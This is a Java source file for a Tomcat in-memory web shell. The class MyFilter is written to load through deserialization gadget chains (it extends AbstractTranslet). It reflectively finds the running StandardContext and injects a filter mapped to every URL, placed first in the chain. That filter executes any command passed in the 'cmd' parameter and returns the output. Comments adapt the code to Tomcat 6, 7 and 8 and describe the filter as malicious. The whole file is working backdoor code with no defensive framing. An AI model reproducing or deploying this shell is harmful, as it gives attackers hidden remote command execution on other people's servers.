package com.memeryShell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.session.ManagerBase;
import org.apache.catalina.session.StandardManager;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.modeler.BaseModelMBean;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class MyFilter extends AbstractTranslet implements Filter {

    protected static String FILTERURL = "/*";
    protected static String FILTERNAME = "myFilter";
    protected static String ARG = "cmd";

    private static StandardContext standardContext = null;

    static {
        try{
            getStandardContext();
            if (standardContext != null){
                memery(new MyFilter());
            }
        }catch (Exception e){}
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    /**
     *
     * */
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if (servletRequest.getParameter(ARG) != null){
            String buffer = "";
            StringBuffer stringBuffer = new StringBuffer();
            InputStream cmdInputStrem = Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(cmdInputStrem);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            while ((buffer = bufferedReader.readLine()) != null){
                stringBuffer.append(buffer);
            }
            servletResponse.getWriter().write(stringBuffer.toString());
        }
        //不破坏流程
        else {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    private static void memery(Object filter) throws Exception{
        try {
            //生成一个FilterMap
            //生成一个ApplicationFilterConfig
            //注意区分Tomcat7 和 Tomcat8
            Class filterDefClass = null;
            Class filterMapClass = null;
            Object filterMap = null;
            //Tomcat6 7
            try {
                filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            }
            //Tomcat8
            catch (ClassNotFoundException e) {
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            }
            Constructor filterMapClassDeclaredConstructor = filterMapClass.getDeclaredConstructor();
            filterMap = filterMapClassDeclaredConstructor.newInstance();
            Method setFilterNameMethod = filterMap.getClass().getDeclaredMethod("setFilterName", String.class);
            setFilterNameMethod.invoke(filterMap, FILTERNAME);
            Method addURLPatternMethod = filterMap.getClass().getDeclaredMethod("addURLPattern", String.class);
            addURLPatternMethod.invoke(filterMap, FILTERURL);

            //设下filterName和filter
            //Tomcat7/8/9
            //存在setFilter
            try {
                Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();
                Method setFilterMethod = filterDef.getClass().getDeclaredMethod("setFilter", Filter.class);
                setFilterMethod.setAccessible(true);
                setFilterMethod.invoke(filterDef, filter);

                Field filterClassFiled = filterDef.getClass().getDeclaredField("filterClass");
                filterClassFiled.setAccessible(true);
                filterClassFiled.set(filterDef, filter.getClass().getName());

                Field filterNameFiled = filterDef.getClass().getDeclaredField("filterName");
                filterNameFiled.setAccessible(true);
                filterNameFiled.set(filterDef, FILTERNAME);

                Class applicationFilterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor applicationFilterConfigConstructor = applicationFilterConfigClass.getDeclaredConstructor(
                    org.apache.catalina.Context.class,
                    filterDefClass
                );
                applicationFilterConfigConstructor.setAccessible(true);
                Object applicationFilterConfig = applicationFilterConfigConstructor.newInstance(
                    standardContext,
                    filterDef
                );
                //拿到HashMap<String, ApplicationFilterConfig> filterConfigs
                Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);
                HashMap filterConfig = (HashMap) filterConfigsField.get(standardContext);
                filterConfig.put(FILTERNAME, applicationFilterConfig);

                Field contextFilterMapsField = StandardContext.class.getDeclaredField("filterMaps");
                contextFilterMapsField.setAccessible(true);
                //private static final类。直接反射操作吧，省事
                Object contextFilterMaps = contextFilterMapsField.get(standardContext);
                //调用其addBefore()，让我们的Filter打在最前面
                Method addBeforeMethod = contextFilterMaps.getClass().getDeclaredMethod("addBefore", filterMapClass);
                addBeforeMethod.setAccessible(true);
                addBeforeMethod.invoke(contextFilterMaps, filterMap);
            }
            //Tomcat6
            // 1.无setFilter
            // 2. filterDef传null
            // 3. FilterMap filterMaps[].得手动扩充数组
            //里面一些实现也不一样，直接拆分成两块吧。。麻了
            catch (NoSuchMethodException e) {
                Class applicationFilterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor applicationFilterConfigConstructor = applicationFilterConfigClass.getDeclaredConstructor(
                    org.apache.catalina.Context.class,
                    filterDefClass
                );
                applicationFilterConfigConstructor.setAccessible(true);
                Object applicationFilterConfig = applicationFilterConfigConstructor.newInstance(
                    standardContext,
                    null
                );

                //直接反射设置ApplicationFilterConfig.filter
                Field filterField = applicationFilterConfigClass.getDeclaredField("filter");
                filterField.setAccessible(true);
                filterField.set(applicationFilterConfig, filter);

                //拿到HashMap<String, ApplicationFilterConfig> filterConfigs
                Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);
                HashMap filterConfig = (HashMap) filterConfigsField.get(standardContext);
                filterConfig.put(FILTERNAME, applicationFilterConfig);

                Field contextFilterMapsField = StandardContext.class.getDeclaredField("filterMaps");
                contextFilterMapsField.setAccessible(true);
                //private static final类。直接反射操作吧，省事
                Object filterMaps = contextFilterMapsField.get(standardContext);

                //新建一个FilterMaps数组. 长度是原数组的+1
                int originalLength = Array.getLength(filterMaps);
                Object newFilterMaps = Array.newInstance(filterMapClass, originalLength + 1);
                //将原FilterMaps拷到新的里头
                System.arraycopy(filterMaps, 0, newFilterMaps, 1, originalLength);
                //newFilterMaps第一个元素，设成恶意Filter
                Array.set(newFilterMaps, 0, filterMap);

                //将新数组打进StandardContext
                contextFilterMapsField.set(standardContext, newFilterMaps);
            }
        } catch (Exception e) {
            return;
        }
    }

    /**
     * 使用获取StandardContext
     * */
    private static void getStandardContext(){
        try{
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            mbsInterceptorField.setAccessible(true);
            Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);

            Field repositoryField = mbsInterceptor.getClass().getDeclaredField("repository");
            repositoryField.setAccessible(true);
            Object repository = repositoryField.get(mbsInterceptor);

            Field domainTbField = repository.getClass().getDeclaredField("domainTb");
            domainTbField.setAccessible(true);
            Map<String, Map<String, NamedObject>> domainTb = (Map) domainTbField.get(repository);
            Map<String, NamedObject> catalina = domainTb.get("Catalina");
            Set<String> set = catalina.keySet();

            // 由于每一个webapp，都有自己的standardContext。需要从列表里头找到当前webapp的standardContext
            ArrayList<Context> standardContextArrayList = new ArrayList();

            //循环两次
            //第一次，拿到所有的webapp的standerContext
            for (String key : set) {
                NamedObject namedObject = catalina.get(key);
                //Tomcat7/8
                //一层层判断下去，防止报错
                if (namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class)) {
                    BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                    if (key.startsWith("context=") && key.endsWith(",type=Manager")) {
                        StandardManager managedResource = (StandardManager) baseModelMBean.getManagedResource();
                        //由于Tomcat7 和 Tomcat8 稍有差异。通过反射获取较为稳定
                        //用Catch来区分是Tomcat7
                        //Tomcat7 为 container
                        try {
                            Field contextFiled = ManagerBase.class.getDeclaredField("container");
                            contextFiled.setAccessible(true);
                            StandardContext context = (StandardContext) contextFiled.get(managedResource);
                            standardContextArrayList.add(context);
                        }
                        //尝试Tomcat8
                        //Tomcat8 为 context
                        catch (NoSuchFieldException e) {
                            Field contextFiled = ManagerBase.class.getDeclaredField("context");
                            contextFiled.setAccessible(true);
                            StandardContext context = (StandardContext) contextFiled.get(managedResource);
                            standardContextArrayList.add(context);
                        }
                    }
                }
                //Tomcat6
                else if (namedObject.getObject().getClass().isAssignableFrom(org.apache.catalina.mbeans.NamingResourcesMBean.class)) {
                    BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                    if (key.startsWith("host=") && key.contains(",type=NamingResources")) {
                        Object managedResource = baseModelMBean.getManagedResource();
                        Field contextFiled = managedResource.getClass().getDeclaredField("container");
                        contextFiled.setAccessible(true);
                        StandardContext context = (StandardContext) contextFiled.get(managedResource);
                        standardContextArrayList.add(context);
                    }
                }
            }

            //第二次，根据当前的request，找到匹配的standerContext
            for (String key : set) {
                if (standardContext != null) {
                    break;
                }
                NamedObject namedObject = catalina.get(key);
                if (namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class)) {
                    BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                    if (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) {
                        //能进入这里，说明获取到正确的request了
                        //这里的第0个，就可以获得maxRequestUri
                        RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();
                        //判断下processors数量，有的是0，不是我们要找的
                        Field processorsField = requestGroupInfo.getClass().getDeclaredField("processors");
                        //拿第0个process的maxRequestUri作为contextPath
                        processorsField.setAccessible(true);
                        ArrayList<RequestInfo> processors = (ArrayList) processorsField.get(requestGroupInfo);
                        //排除掉processors是0的
                        if (processors.size() > 0) {
                            RequestInfo requestInfo0 = processors.get(0);
                            String maxRequestUri = requestInfo0.getMaxRequestUri(); //As context path
                            for (Context context : standardContextArrayList) {
                                if (context.getClass().isAssignableFrom(StandardContext.class)) {
                                    StandardContext standardContextTmp = (StandardContext) context;
                                    String standardContextPath = standardContextTmp.getPath();
                                    //当前request contextPath 和 standardContextPath匹配，则操作这个standardContext，塞入内存马
                                    //Do Filter Memery Shell
                                    if (maxRequestUri.contains(standardContextPath)) {
                                        standardContext = standardContextTmp;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {}
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
